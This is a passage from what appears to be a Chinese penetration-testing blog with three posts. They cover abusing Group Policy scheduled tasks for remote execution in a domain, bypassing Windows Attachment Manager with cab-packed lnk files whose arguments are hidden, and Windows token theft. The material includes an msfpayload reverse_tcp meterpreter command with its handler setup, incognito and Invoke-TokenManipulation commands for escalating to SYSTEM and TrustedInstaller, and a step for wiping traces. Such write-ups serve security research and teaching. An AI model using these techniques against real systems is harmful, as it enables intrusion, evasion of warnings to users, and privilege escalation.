<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module GroupPolicy –verbose
</code></pre></div></div>

<p>获得所有GPO的内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-GPO -All
</code></pre></div></div>

<p>将所有GPO导出为一个HTML报告：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-GPOReport -All -ReportType html -Path C:\GposReport\GposReport.html
</code></pre></div></div>

<p>将每个GPO单独导出一个HTML报告：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-GPO -All | %{
Get-GPOReport -name $_.displayname -ReportType html -path ("c:\GPOReports\"+$_.displayname+".html")
}
</code></pre></div></div>

<p>查看指定GPO的权限设置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-GPPermission -Name "TestGPO1" -All 
</code></pre></div></div>

<p>备份指定GPO：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Backup-Gpo -Name TestGPO1 -Path C:\GpoBackups
</code></pre></div></div>

<p>备份所有GPO：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Backup-Gpo -All -Path "c:\GpoBackups"
</code></pre></div></div>

<p>还原指定GPO：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Restore-GPO -Name TestGPO1 -Path C:\GpoBackups
</code></pre></div></div>

<p>还原所有GPO：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Restore-GPO -All -Path "c:\GpoBackups"
</code></pre></div></div>

<p>根据不同情况，有以下两种利用思路：</p>

<h3 id="1新建组策略创建计划任务实现远程执行">1、新建组策略，创建计划任务实现远程执行</h3>

<ul>
  <li>创建一个新的GPO</li>
  <li>备份GPO</li>
  <li>修改Backup.xml和gpreport.xml</li>
  <li>创建ScheduledTasks.xml</li>
  <li>还原GPO</li>
  <li>强制客户端刷新策略</li>
  <li>清理操作痕迹</li>
</ul>

<h3 id="2修改已有组策略替换计划任务">2、修改已有组策略，替换计划任务</h3>

<p>如果域控制器上已有策略并配置了计划任务</p>

<p>不再需要注册，修改ScheduledTasks.xml就好</p>

<h2 id="0x06-gpo的常用操作">0x06 GPO的常用操作</h2>
<hr>

<p>创建OU:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-ADOrganizationalUnit -Name OUTest1 -Path "dc=test,dc=com"
</code></pre></div></div>

<p>查看当前域中的所有计算机:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dsquery computer
</code></pre></div></div>

<p>获得结果”CN=Computer1,CN=Computers,DC=test,DC=com”</p>

<p>将该计算机加到OU=OUTest1中:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dsmove "CN=Computer1,CN=Computers,DC=test,DC=com" -newparent OU=OUTest1,dc=test,dc=com
</code></pre></div></div>

<p>查询OU=OUTest1中的计算机:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dsquery computer OU=OUTest1,dc=test,dc=com
</code></pre></div></div>

<p>创建GPO并连接:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new-gpo -name TestGPO | new-gplink -Target "OU=OUTest1,dc=test,dc=com"
</code></pre></div></div>

<p>还原：</p>

<p>将计算机Computer1从OU=OUTest1中移除</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dsmove "CN=Computer1,OU=OUTest1,DC=test,DC=com" -newparent CN=Computers,dc=test,dc=com
</code></pre></div></div>

<p>删除OU=OUTest1：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set-ADOrganizationalUnit -Identity "OU=OUTest1,dc=test,dc=com" -ProtectedFromAccidentalDeletion $false
Remove-ADOrganizationalUnit -Identity "OU=OUTest1,dc=test,dc=com" -Recursive -Confirm:$False
</code></pre></div></div>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了利用GPO中的计划任务实现远程执行的方法，分析利用思路，通过命令行实现了GPO和计划任务的创建、修改和删除。</p>

<h2 id="0x08-补充">0x08 补充</h2>

<p>我注意到harmj0y的博客中提到了某些情况下他的脚本无法使用的情况：</p>

<p>http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/</p>

<p>个人认为是因为创建的计划任务没有注册，使用我修改以后的脚本应该能解决这个问题，如果读者有新的建议，欢迎及时反馈。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 21, 2018
  </div>

  
</article><article class="post">
  <h1>An interesting way of bypassing Windows Attachment Manager</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近看到了一篇文章《Bypassing Windows Attachment Manager》，作者rvrsh3ll@424f424f，文中介绍了他绕过Windows Attachment Manager的思路，很有趣。
恰好我对文中涉及到的ADS和lnk文件利用有过研究，所以，本文将结合我的一些心得，对该绕过方法做拓展介绍，并分享一个我在实际测试过程中发现的有趣问题</p>

<p>相关文章地址如下：</p>

<p>《Bypassing Windows Attachment Manager》：</p>

<p>http://www.rvrsh3ll.net/blog/informational/bypassing-windows-attachment-manager/</p>

<p>我之前的一些研究心得：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%82%E6%95%B0%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7/">《渗透技巧——快捷方式文件的参数隐藏技巧》</a></p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Hidden%20Alternative%20Data%20Streams%E7%9A%84%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">《Hidden Alternative Data Streams的进阶利用技巧》</a></p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Windows Attachment Manager作用</li>
  <li>Windows Attachment Manager实现方式</li>
  <li>Windows Attachment Manager的绕过思路</li>
  <li>特殊文件的构造</li>
  <li>实际测试过程中发现的有趣问题</li>
</ul>

<h2 id="0x02-windows-attachment-manager">0x02 Windows Attachment Manager</h2>
<hr>

<h3 id="简介">简介</h3>

<ul>
  <li>自WinXp SP2开始，微软推出的新功能</li>
  <li>用来防止文件从非信任的途径下载后可以直接执行</li>
  <li>非信任的途径包括邮件和互联网下载</li>
</ul>

<p>如果发现文件来自于非信任的途径，那么该文件在打开时会弹框提示用户，需要用户确认才能执行，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/2-1.png" alt="Alt text"></p>

<p>被标记为High-risk的文件格式如下：</p>

<p>.ade,.adp,.app,.asp,.bas,.bat,.cer,.chm,.cmd,.com,.cpl,.crt,.csh,.exe,.fxp,.hlp,.hta,.inf,.ins,.isp,.its,.js,.jse,.ksh,.lnk,.mad,.maf,.mag,.mam,.maq,.mar,.mas,.mat,.mau,.mav,.maw,.mda,.mdb,.mde,.mdt,.mdw,.mdz,.msc,.msi,.msp,.mst,.ops,.pcd,.pif,.prf,.prg,.pst,.reg,.scf,.scr,.sct,.shb,.shs,.tmp,.url,.vb,.vbe,.vbs,.vsmacros,.vss,.vst,.vsw,.ws,.wsc,.wsf,.wsh</p>

<p>详细资料可参考：</p>

<p>https://support.microsoft.com/en-us/help/883260/information-about-the-attachment-manager-in-microsoft-windows</p>

<h3 id="实现方式">实现方式</h3>

<p>不可信的文件在下载时会被添加ADS:Zone.Identifier:$DATA</p>

<p>ADS详细内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ZoneTransfer]
ZoneId=3
</code></pre></div></div>

<p>也就是说，只要包含<code class="language-plaintext highlighter-rouge">ADS:Zone.Identifier:$DATA</code>，那么该文件在打开时就会弹框提示用户，需要用户确认才能执行</p>

<h3 id="绕过思路">绕过思路</h3>

<p><strong>1、删除文件的ADS，那么在打开该文件的时候就不会弹框</strong></p>

<p>对于小文件，可以使用Windows默认命令more</p>

<p>对于大文件，可使用工具Streams</p>

<p><strong>注：</strong></p>

<p>细节可参考<a href="https://3gstudent.github.io/3gstudent.github.io/Hidden%20Alternative%20Data%20Streams%E7%9A%84%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">《Hidden Alternative Data Streams的进阶利用技巧》</a></p>

<p>也可通过界面操作，如下图，选择Unblock</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/2-2.png" alt="Alt text"></p>

<p><strong>2、改变传输途径</strong></p>

<p>如果将文件复制到另一操作系统，原文件的ADS不会保存</p>

<p>也就是说，将之前下载的非信任文件通过可信方式复制到另一操作系统，那么该文件在新系统是不会被标记为“不可信”的</p>

<p>例如：</p>

<p>从互联网下载的文件python-2.7.12.msi，默认被添加ADS:Zone.Identifier:$DATA，打开时会弹框</p>

<p>现在将该文件拖到虚拟机中(该操作被认为是可信方式，不会被添加ADS)，而且原ADS不会保存，所以在打开该文件的过程不会弹框</p>

<h2 id="0x03-特殊文件的构造">0x03 特殊文件的构造</h2>
<hr>

<p>既然不可信的文件在下载时会被添加ADS:Zone.Identifier:$DATA，那么如果是压缩后的文件呢？解压缩后是否还会包含ADS？</p>

<p>测试系统： Win10x64</p>

<p>HTTP服务器： Kali Linux</p>

<p>开启HTTP服务器功能：</p>

<p><code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer 80</code></p>

<p><strong>1、尝试.exe+.rar</strong></p>

<p>使用WinRAR将putty.exe压缩成putty.rar，上传至HTTP服务器</p>

<p><strong>注：</strong></p>

<p>Win10系统默认无法解压缩.rar文件，需要手动安装WinRAR</p>

<p>测试系统通过Chrome下载putty.rar，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/3-1.png" alt="Alt text"></p>

<p>使用WinRAR解压缩并打开文件，未弹框</p>

<p><strong>结论1：</strong></p>

<p>.rar内的压缩文件不会被添加ADS</p>

<p><strong>2、尝试.lnk+.rar</strong></p>

<p>压缩lnk文件时会直接对lnk指向的源文件压缩，无法压缩lnk文件本身，测试失败</p>

<p><strong>3、尝试.exe+zip</strong></p>

<p>使用WinRAR将putty.exe压缩成putty.zip，上传至HTTP服务器</p>

<p>测试系统通过Chrome下载putty.zip</p>

<p>通过Windows Explorer打开zip文件，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/3-2.png" alt="Alt text"></p>

<p>打开后弹框，提示用户，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/3-3.png" alt="Alt text"></p>

<p>而使用WinRAR解压缩并打开文件，并未弹框</p>

<p><strong>结论2：</strong></p>

<p>Windows Attachment Manager不支持WinRAR这类第三方软件</p>

<p><strong>4、尝试.exe+cab</strong></p>

<p>接下来没必要测试需要第三方软件才能使用的压缩格式，应该继续寻找Windows系统默认支持的格式</p>

<p>比如.cab文件</p>

<p><strong>注：</strong></p>

<p>cab文件可通过makecab.exe生成，系统默认包含</p>

<p>压缩类型包括：none，mszip，lzx</p>

<p>使用makecab将putty.exe压缩成putty.cab，压缩类型选择lzx，命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">makecab /d compressiontype=lzx putty.exe putty.cab</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/3-4.png" alt="Alt text"></p>

<p>上传至HTTP服务器</p>

<p>测试系统通过Chrome下载</p>

<p>解压缩，保存文件，打开，弹框</p>

<p>将文件拖至任一路径，打开，不弹框</p>

<p>完整测试过程如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/2.gif" alt="Alt text"></p>

<p>gif在线地址：</p>

<p>https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/2.gif</p>

<p>使用Procmon监控两种操作，区别如下图，此处需要继续研究，做更多的测试</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/5-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>Win10 Build 14393(1607)及之前版本均存在这个问题,Win10 Build 15063(1703)已经修复该问题</p>

<p><strong>结论3：</strong></p>

<p>使用cab压缩文件，接着拖动文件保存，能够绕过Windows Attachment Manager</p>

<p><strong>5、尝试.lnk+cab</strong></p>

<p><strong>注：</strong></p>

<p>该方法来自rvrsh3ll@424f424f的文章，但我在测试的时候发现了另外一个有趣的问题</p>

<p>使用makecab将test.lnk压缩成test.cab，压缩类型选择lzx，命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">makecab /d compressiontype=lzx test.lnk test.cab</code></p>

<p><strong>注：</strong></p>

<p>cab文件能够压缩lnk文件本身，为了增加迷惑性，可以使用以下测试代码：</p>

<p>test.txt中写入如下内容：</p>

<p><code class="language-plaintext highlighter-rouge">/c start calc.exe</code></p>

<p>powershell代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$file = Get-Content "c:\test\test.txt"
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("c:\test\test.lnk")
$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"
$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,3"
$Shortcut.Arguments = $file
$Shortcut.Save()
</code></pre></div></div>

<p>生成的lnk文件参数被空格字符填充，实际payload被隐藏，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/3-5.png" alt="Alt text"></p>

<p>更多细节可参考：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%82%E6%95%B0%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7/">《渗透技巧——快捷方式文件的参数隐藏技巧》</a></p>

<p>将test.cab上传至HTTP服务器</p>

<p>测试系统通过Chrome下载</p>

<p>解压缩，保存文件，打开，弹框（同测试4）</p>

<p>将文件拖至任一路径，打开，不弹框（同测试4）</p>

<p><strong>一个有趣的问题：</strong></p>

<p>将lnk文件解压缩，保存文件，打开，弹框</p>

<p>接着右键查看lnk文件属性，再次打开lnk文件，不弹框，ADS被清除</p>

<p>完整测试过程如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/1.gif" alt="Alt text"></p>

<p>gif在线地址：</p>

<p>https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/1.gif</p>

<p><strong>结论4：</strong></p>

<p>在某些特殊情况下(Win10 Build 14393(1607)之前的版本)，ADS会清除，导致能够绕过Windows Attachment Manager</p>

<p><strong>注：</strong></p>

<p>Win10 Build 10586存在该问题，Win10 Build 14393(1607)修复了该问题</p>

<h2 id="0x04-补充">0x04 补充</h2>
<hr>

<p>Win7系统不存在以上问题，原因：</p>

<p>打开cab文件后，在保存文件时会弹框提示用户(该特性Win10不存在)</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/4-1.png" alt="Alt text"></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<ul>
  <li>不可信的文件在下载时会被添加ADS:Zone.Identifier:$DATA</li>
  <li>如果将文件复制到另一操作系统，原文件的ADS不会保存</li>
  <li>相比于rar和zip格式，使用cab格式压缩lnk文件更为合适</li>
  <li>lnk文件欺骗性更高</li>
  <li>Win10 Build 15063(1703)已经修复以上bug</li>
</ul>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May 10, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Token窃取与利用</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8/">《渗透技巧——程序的降权启动》</a>介绍了使用SelectMyParent降权的方法，本质上是通过token窃取实现的。这一次将要对token窃取和利用做进一步介绍，测试常用工具，分享利用技巧。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容;</p>

<ul>
  <li>Token简介</li>
  <li>Metasploit中的incognito</li>
  <li>Windows平台下的incognito</li>
  <li>Invoke-TokenManipulation.ps1用法</li>
  <li>利用token获得system权限</li>
  <li>利用token获得TrustedInstaller权限</li>
</ul>

<h2 id="0x02-token简介">0x02 Token简介</h2>
<hr>

<p>Windows有两种类型的Token：</p>

<ul>
  <li>
    <p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p>
  </li>
  <li>
    <p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p>
  </li>
</ul>

<p><strong>注：</strong></p>

<p>两种token只在系统重启后清除</p>

<p>具有<code class="language-plaintext highlighter-rouge">Delegation token</code>的用户在注销后，该Token将变成<code class="language-plaintext highlighter-rouge">Impersonation token</code>，依旧有效</p>

<h3 id="实际测试">实际测试</h3>

<p>使用<code class="language-plaintext highlighter-rouge">Test\a</code>登录后注销，再使用<code class="language-plaintext highlighter-rouge">administrator</code>登录</p>

<p>查看token：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe list_tokens -u
</code></pre></div></div>

<p>能够获取到已注销用户<code class="language-plaintext highlighter-rouge">Test\a</code>的token，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/2-1.png" alt="Alt text"></p>

<p>利用该token执行calc.exe:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe execute -c "TEST\a" calc.exe
</code></pre></div></div>

<p>后台显示进程calc.exe的用户名为<code class="language-plaintext highlighter-rouge">a</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/2-2.png" alt="Alt text"></p>

<h2 id="0x03-metasploit中的incognito">0x03 Metasploit中的incognito</h2>
<hr>

<p>在Metasploit中，可使用incognito实现token窃取，常用命令如下：</p>

<p>加载incognito：<code class="language-plaintext highlighter-rouge">load incognito</code></p>

<p>列举token：<code class="language-plaintext highlighter-rouge">list_tokens -u</code></p>

<p>查看当前token：<code class="language-plaintext highlighter-rouge">getuid</code></p>

<p>提示至system权限：<code class="language-plaintext highlighter-rouge">getsystem</code></p>

<p>token窃取：<code class="language-plaintext highlighter-rouge">impersonate_token "NT AUTHORITY\\SYSTEM"</code></p>

<p>从进程窃取：<code class="language-plaintext highlighter-rouge">steal_token 1252</code></p>

<p>返回之前token：<code class="language-plaintext highlighter-rouge">rev2self</code> or <code class="language-plaintext highlighter-rouge">drop_token</code></p>

<h3 id="实际测试-1">实际测试</h3>

<p>Client：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfpayload -p windows/meterpreter/reverse_tcp LHOST=192.168.81.142 LPORT=44444 X &gt;test.exe
</code></pre></div></div>

<p>Server：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LPORT 44444
set LHOST 192.168.81.142
exploit
</code></pre></div></div>

<p>执行<code class="language-plaintext highlighter-rouge">getsystem</code>获得system权限</p>

<p>pid 1252的权限为当前用户，执行<code class="language-plaintext highlighter-rouge">steal_token 1252</code>， 将权限切换到<code class="language-plaintext highlighter-rouge">WIN-R7MM90ERBMD\a</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/2-3.png" alt="Alt text"></p>

<p>执行<code class="language-plaintext highlighter-rouge">impersonate_token "NT AUTHORITY\\SYSTEM"</code>将权限切换至<code class="language-plaintext highlighter-rouge">system</code></p>

<p><strong>注：</strong></p>

<p>需要加引号和双斜杠，<code class="language-plaintext highlighter-rouge">"NT AUTHORITY\\SYSTEM"</code></p>

<p>执行<code class="language-plaintext highlighter-rouge">rev2self</code>返回之前token，为<code class="language-plaintext highlighter-rouge">WIN-R7MM90ERBMD\a</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/2-4.png" alt="Alt text"></p>

<p>通过以上演示，成功通过token窃取实现权限切换</p>

<h2 id="0x04-windows平台下的incognito">0x04 Windows平台下的incognito</h2>
<hr>

<p>Metasploit中的incognito，是从windows平台下的incognito移植过来的，下面介绍一下windows平台下的incognito</p>

<p><strong>下载地址：</strong></p>

<p>https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</p>

<p><strong>参考手册：</strong></p>

<p>http://labs.mwrinfosecurity.com/assets/142/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf</p>

<p>常见用法如下：</p>

<p>列举token：<code class="language-plaintext highlighter-rouge">incognito.exe list_tokens -u</code></p>

<p>复制token：<code class="language-plaintext highlighter-rouge">incognito.exe execute [options] &lt;token&gt; &lt;command&gt;</code></p>

<h3 id="实际测试-2">实际测试</h3>

<p>列举token：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe list_tokens -u
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/3-1.png" alt="Alt text"></p>

<p>提权至system：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/3-2.png" alt="Alt text"></p>

<p>降权至当前用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe execute -c "WIN-R7MM90ERBMD\a" cmd.exe
</code></pre></div></div>

<p>伪造用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>incognito.exe execute -c "WIN-R7MM90ERBMD\b" cmd.exe
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/3-3.png" alt="Alt text"></p>

<h2 id="0x05-invoke-tokenmanipulationps1用法">0x05 Invoke-TokenManipulation.ps1用法</h2>
<hr>

<p><strong>下载地址：</strong></p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</p>

<p>原理和功能同incognito类似，能够实际提权和降权</p>

<p>列举token：<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -Enumerate</code></p>

<p>提权至system：<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"</code></p>

<p>复制进程token：<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500</code></p>

<p>复制线程token：<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500</code></p>

<p>还有更多用法可参考该脚本说明</p>

<p>实际测试略</p>

<h2 id="0x06-利用token获得trustedinstaller权限">0x06 利用token获得TrustedInstaller权限</h2>
<hr>

<p>在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件</p>

<p>因为Windows系统的最高权限为<code class="language-plaintext highlighter-rouge">TrustedInstaller</code></p>

<p>例如路径<code class="language-plaintext highlighter-rouge">C:\Windows\servicing</code></p>

<p>使用system权限无法在该路径创建文件</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/4-1.png" alt="Alt text"></p>

<p>查看文件夹属性，显示system不具有写入权限，只有<code class="language-plaintext highlighter-rouge">TrustedInstaller</code>可以</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/4-2.png" alt="Alt text"></p>

<p>关于如何获得TrustedInstaller权限，可参考James Forshaw的这篇文章，很值得学习</p>

<p>https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html</p>

<p>这里对其中的一个实例做测试，进而找到其他实现方法</p>

<p>启动TrustedInstaller服务会启动进程TrustedInstaller.exe，位置为<code class="language-plaintext highlighter-rouge">C:\Windows\servicing\TrustedInstaller.exe</code>，查看该程序权限：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner
</code></pre></div></div>

<p>显示为<code class="language-plaintext highlighter-rouge">NT SERVICE\TrustedInstaller</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/4-3.png" alt="Alt text"></p>

<p>James Forshaw的实现思路为借用TrustedInstaller.exe的token创建子进程，这样子进程就有了TrustedInstaller权限，具体powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-NtTokenPrivilege SeDebugPrivilege
$p = Get-NtProcess -Name TrustedInstaller.exe
$proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p
</code></pre></div></div>

<p>powershell默认不支持<code class="language-plaintext highlighter-rouge">Set-NtTokenPrivilege</code>命令，该模块需要下载安装</p>

<p><strong>下载地址：</strong></p>

<p>https://www.powershellgallery.com/packages/NtObjectManager/1.1.1</p>

<p>安装命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Save-Module -Name NtObjectManager -Path c:\test
Install-Module -Name NtObjectManager
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>Save-Module需要powershell v5.0支持，详情见：</p>

<p>https://docs.microsoft.com/zh-cn/powershell/gallery/readme</p>

<p>因此测试系统选为Win10，默认powershell版本为5.0</p>

<p>导入该模块需要系统允许执行powershell脚本，因此先执行如下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-ExecutionPolicy Unrestricted
</code></pre></div></div>

<p>导入模块NtObjectManager：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module NtObjectManager
</code></pre></div></div>

<p>执行命令测试：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe start TrustedInstaller
Set-NtTokenPrivilege SeDebugPrivilege
$p = Get-NtProcess -Name TrustedInstaller.exe
$proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p
</code></pre></div></div>

<p>使用whoami查看当前cmd权限：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /groups /fo list
</code></pre></div></div>

<p>发现当前cmd.exe在TrustedInstaller组里，成功获得TrustedInstaller权限</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/4-4.png" alt="Alt text"></p>

<p>接着按照James Forshaw文章中更新的内容，学习了Vincent Yiu@vysecurity的方法，使用metasploit下的incognito也能够获得TrustedInstaller权限</p>

<p><strong>地址如下：</strong></p>

<p>https://twitter.com/vysecurity/status/899303538630774787</p>

<p>思路如下：</p>

<ul>
  <li>启动服务TrustedInstaller</li>
  <li>使用incognito获取TrustedInstaller.exe的token</li>
  <li>获得TrustedInstaller权限</li>
</ul>

<p>使用以下命令：</p>

<ul>
  <li>load incognito</li>
  <li>getsytem</li>
  <li>ps</li>
  <li>steal_token 3204</li>
  <li>getuid</li>
</ul>

<p>按照这个思路，猜测使用SelectMyParent和Invoke-TokenManipulation.ps1也能获得TrustedInstaller权限</p>

<p>下面验证我们的判断</p>

<p><strong>1、SelectMyParent</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc start TrustedInstaller
SelectMyParent.exe cmd.exe 1700
</code></pre></div></div>

<p>新的cmd.exe拥有TrustedInstaller权限</p>

<p><strong>2、Invoke-TokenManipulation.ps1</strong></p>

<p>添加如下代码即可：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc.exe start TrustedInstaller
$id  = Get-Process -name TrustedInstaller* | Select-Object id | ForEach-Object -Process{$_.id}
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId $id
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>sc这个命令不能直接在powershell里面运行，powershell会把它当作set-content的别名，可使用sc.exe在powershell里面运行sc命令</p>

<h3 id="验证是否获得trustedinstaller权限的方法">验证是否获得TrustedInstaller权限的方法</h3>

<p><strong>1、对特殊路径写文件</strong></p>

<p>例如<code class="language-plaintext highlighter-rouge">C:\Windows\servicing</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-30/4-5.png" alt="Alt text"></p>

<p><strong>2、使用powershell</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner
</code></pre></div></div>

<p>回显为<code class="language-plaintext highlighter-rouge">NT SERVICE\TrustedInstaller</code></p>

<p><strong>3、使用whoami</strong></p>

